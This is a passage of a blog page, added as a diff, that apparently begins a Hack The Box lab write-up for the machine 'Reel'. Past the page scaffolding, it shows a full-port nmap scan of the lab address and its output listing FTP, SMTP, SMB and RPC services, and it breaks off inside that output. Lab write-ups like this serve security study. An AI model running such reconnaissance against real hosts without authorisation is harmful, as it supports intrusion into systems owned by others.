@@ -1,0 +1,791 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Hack The Box - Reel 端口扫描分析：1nmap -sV -sC -Pn -p- -T4 10.10.10.77  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Reel">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Reel/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Hack The Box - Reel 端口扫描分析：1nmap -sV -sC -Pn -p- -T4 10.10.10.77  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220407153021950.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.877Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:35.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220407153021950.png">
+  
+  
+  
+  <title>HackTheBox-Reel - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Reel"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          182 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Reel</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Hack The Box - Reel</p>
+<h5 id="端口扫描分析："><a href="#端口扫描分析：" class="headerlink" title="端口扫描分析："></a>端口扫描分析：</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">nmap -sV -<span class="hljs-keyword">sC </span>-Pn -p- -<span class="hljs-built_in">T4</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">77</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.77</span><br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.16</span>s <span class="hljs-variable">latency</span>).<br><span class="hljs-title class_">Not</span> <span class="hljs-variable">shown</span>: <span class="hljs-number">65527</span> <span class="hljs-variable">filtered</span> <span class="hljs-variable">tcp</span> <span class="hljs-title function_">ports</span> (<span class="hljs-variable">no</span><span class="hljs-operator">-</span><span class="hljs-variable">response</span>)<br><span class="hljs-variable">PORT</span>      <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>      <span class="hljs-variable">VERSION</span><br><span class="hljs-number">21</span>/<span class="hljs-variable">tcp</span>    <span class="hljs-variable">open</span>  <span class="hljs-variable">ftp</span>          <span class="hljs-title class_">Microsoft</span> <span class="hljs-variable">ftpd</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">ftp</span><span class="hljs-operator">-</span><span class="hljs-variable">syst</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">SYST</span>: <span class="hljs-title class_">Windows</span>_NT<br><span class="hljs-operator">|</span> <span class="hljs-variable">ftp</span><span class="hljs-operator">-</span><span class="hljs-variable">anon</span>: <span class="hljs-title class_">Anonymous</span> <span class="hljs-variable">FTP</span> <span class="hljs-variable">login</span> <span class="hljs-title function_">allowed</span> (<span class="hljs-variable">FTP</span> <span class="hljs-variable">code</span> <span class="hljs-number">230</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_05</span><span class="hljs-number">-29</span><span class="hljs-number">-18</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span>AM       <span class="hljs-operator">&lt;</span><span class="hljs-variable">DIR</span><span class="hljs-operator">&gt;</span>          <span class="hljs-variable">documents</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span>    <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>          <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">7.6</span> (<span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">ssh</span><span class="hljs-operator">-</span><span class="hljs-variable">hostkey</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-number">2048</span> <span class="hljs-number">82</span>:<span class="hljs-number">20</span>:<span class="hljs-variable">c3</span>:<span class="hljs-variable">bd</span>:<span class="hljs-number">16</span>:<span class="hljs-variable">cb</span>:<span class="hljs-variable">a2</span>:<span class="hljs-number">9</span>c:<span class="hljs-number">88</span>:<span class="hljs-number">87</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">6</span>c:<span class="hljs-number">15</span>:<span class="hljs-number">59</span>:<span class="hljs-variable">ed</span>:<span class="hljs-title function_">ed</span> (<span class="hljs-variable">RSA</span>)<br><span class="hljs-operator">|</span>   <span class="hljs-number">256</span> <span class="hljs-number">23</span>:<span class="hljs-number">2</span>b:<span class="hljs-variable">b8</span>:<span class="hljs-number">0</span>a:<span class="hljs-number">8</span>c:<span class="hljs-number">1</span>c:<span class="hljs-variable">f4</span>:<span class="hljs-number">4</span>d:<span class="hljs-number">8</span>d:<span class="hljs-number">7</span>e:<span class="hljs-number">5</span>e:<span class="hljs-number">64</span>:<span class="hljs-number">58</span>:<span class="hljs-number">80</span>:<span class="hljs-number">33</span>:<span class="hljs-number">45</span> (<span class="hljs-variable">ECDSA</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-number">256</span> <span class="hljs-variable">ac</span>:<span class="hljs-number">8</span>b:<span class="hljs-variable">de</span>:<span class="hljs-number">25</span>:<span class="hljs-number">1</span>d:<span class="hljs-variable">b7</span>:<span class="hljs-variable">d8</span>:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:<span class="hljs-number">9</span>b:<span class="hljs-number">9</span>c:<span class="hljs-number">16</span>:<span class="hljs-variable">bf</span>:<span class="hljs-variable">f6</span>:<span class="hljs-number">3</span>f:<span class="hljs-title function_">ed</span> (<span class="hljs-variable">ED25519</span>)<br><span class="hljs-number">25</span>/<span class="hljs-variable">tcp</span>    <span class="hljs-variable">open</span>  <span class="hljs-variable">smtp?</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">DNSStatusRequest</span>TCP, <span class="hljs-title class_">DNSVersionBindReq</span>TCP, <span class="hljs-title class_">Kerberos</span>, <span class="hljs-title class_">LDAPBindReq</span>, <span class="hljs-title class_">LDAPSearchReq</span>, <span class="hljs-title class_">LPDString</span>, <span class="hljs-variable">NULL</span>, <span class="hljs-title class_">RPCCheck</span>, <span class="hljs-title class_">SMBProgNeg</span>, <span class="hljs-title class_">SSLSessionReq</span>, <span class="hljs-title class_">TLSSessionReq</span>, <span class="hljs-variable">X11Probe</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">ready</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>, <span class="hljs-title class_">GenericLines</span>, <span class="hljs-title class_">GetRequest</span>, <span class="hljs-title class_">HTTPOptions</span>, <span class="hljs-title class_">RTSPRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">ready</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Hello</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">ready</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">EHLO</span> <span class="hljs-title class_">Invalid</span> <span class="hljs-variable">domain</span> <span class="hljs-variable">address</span>.<br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Help</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">ready</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">DATA</span> <span class="hljs-variable">HELO</span> <span class="hljs-variable">EHLO</span> <span class="hljs-variable">MAIL</span> <span class="hljs-variable">NOOP</span> <span class="hljs-variable">QUIT</span> <span class="hljs-variable">RCPT</span> <span class="hljs-variable">RSET</span> <span class="hljs-variable">SAML</span> <span class="hljs-variable">TURN</span> <span class="hljs-variable">VRFY</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">SIPOptions</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">ready</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>     <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">TerminalServerCookie</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Mail</span> <span class="hljs-title class_">Service</span> <span class="hljs-variable">ready</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-variable">sequence</span> <span class="hljs-variable">of</span> <span class="hljs-variable">commands</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">smtp</span><span class="hljs-operator">-</span><span class="hljs-variable">commands</span>: <span class="hljs-variable">REEL</span>, <span class="hljs-variable">SIZE</span> <span class="hljs-number">20480000</span>, <span class="hljs-variable">AUTH</span> <span class="hljs-variable">LOGIN</span> <span class="hljs-variable">PLAIN</span>, <span class="hljs-variable">HELP</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span> <span class="hljs-number">211</span> <span class="hljs-variable">DATA</span> <span class="hljs-variable">HELO</span> <span class="hljs-variable">EHLO</span> <span class="hljs-variable">MAIL</span> <span class="hljs-variable">NOOP</span> <span class="hljs-variable">QUIT</span> <span class="hljs-variable">RCPT</span> <span class="hljs-variable">RSET</span> <span class="hljs-variable">SAML</span> <span class="hljs-variable">TURN</span> <span class="hljs-variable">VRFY</span><br><span class="hljs-number">135</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">msrpc</span>        <span class="hljs-title class_">Microsoft</span> <span class="hljs-title class_">Windows</span> <span class="hljs-variable">RPC</span><br><span class="hljs-number">139</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">netbios</span><span class="hljs-operator">-</span><span class="hljs-variable">ssn</span>  <span class="hljs-title class_">Microsoft</span> <span class="hljs-title class_">Windows</span> <span class="hljs-variable">netbios</span><span class="hljs-operator">-</span><span class="hljs-variable">ssn</span><br><span class="hljs-number">445</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">microsoft</span><span class="hljs-operator">-</span><span class="hljs-variable">ds</span> <span class="hljs-title class_">Windows</span> <span class="hljs-title class_">Server</span> <span class="hljs-number">2012</span> <span class="hljs-variable">R2</span> <span class="hljs-title class_">Standard</span> <span class="hljs-number">9600</span> <span class="hljs-variable">microsoft</span><span class="hljs-operator">-</span><span class="hljs-title function_">ds</span> (<span class="hljs-variable">workgroup</span>: <span class="hljs-variable">HTB</span>)<br><span class="hljs-number">593</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">ncacn_http</span>   <span class="hljs-title class_">Microsoft</span> <span class="hljs-title class_">Windows</span> <span class="hljs-variable">RPC</span> <span class="hljs-variable">over</span> <span class="hljs-variable">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">49159</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">msrpc</span>        <span class="hljs-title class_">Microsoft</span> <span class="hljs-title class_">Windows</span> <span class="hljs-variable">RPC</span><br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>25<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.92</span><span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">4</span>/<span class="hljs-number">6</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">624</span>D4F69<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-variable">NULL</span>,<br><span class="hljs-variable">SF</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Hello</span>,<span class="hljs-number">3</span>A,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Se</span><br><span class="hljs-string">SF:rvice<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>501<span class="hljs-char escape_">\x20</span>EHLO<span class="hljs-char escape_">\x20</span>Invalid<span class="hljs-char escape_">\x20</span>domain<span class="hljs-char escape_">\x20</span>address\.<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-variable">r</span><br><span class="hljs-variable">SF</span>:(<span class="hljs-title class_">Help</span>,<span class="hljs-number">54</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>211<span class="hljs-char escape_">\x20</span>DATA<span class="hljs-char escape_">\x20</span>HELO<span class="hljs-char escape_">\x20</span>EHL</span><br><span class="hljs-string">SF:O<span class="hljs-char escape_">\x20</span>MAIL<span class="hljs-char escape_">\x20</span>NOOP<span class="hljs-char escape_">\x20</span>QUIT<span class="hljs-char escape_">\x20</span>RCPT<span class="hljs-char escape_">\x20</span>RSET<span class="hljs-char escape_">\x20</span>SAML<span class="hljs-char escape_">\x20</span>TURN<span class="hljs-char escape_">\x20</span>VRFY<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<br><span class="hljs-variable">SF</span>:<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">GenericLines</span>,<span class="hljs-number">54</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>se</span><br><span class="hljs-string">SF:quence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span>\</span><br><span class="hljs-string">SF:n&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">GetRequest</span>,<span class="hljs-number">54</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>s</span><br><span class="hljs-string">SF:equence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span></span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">54</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad\x2</span><br><span class="hljs-string">SF:0sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad<span class="hljs-char escape_">\x20</span>sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">54</span>,<span class="hljs-string">&quot;220<span class="hljs-char escape_">\x20</span>Mail<span class="hljs-char escape_">\x20</span>Service<span class="hljs-char escape_">\x20</span>ready<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>503<span class="hljs-char escape_">\x20</span>Bad\</span><br><span class="hljs-string">SF:x20sequence<span class="hljs-char escape_">\x20</span>of<span class="hljs-char escape_">\x20</span>commands<span class="hljs-char 